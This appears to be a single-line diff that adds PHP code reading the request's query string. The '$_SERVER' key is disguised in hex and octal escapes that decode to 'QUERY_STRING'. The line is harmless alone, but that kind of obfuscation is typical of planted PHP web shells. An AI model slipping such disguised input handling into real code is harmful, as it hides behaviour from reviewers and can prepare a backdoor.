@@ -1,0 +1,1 @@
+$query = urldecode($_SERVER["\x51\x55\x45\122\x59\x5f\123\x54\122\x49\x4e\x47"]);
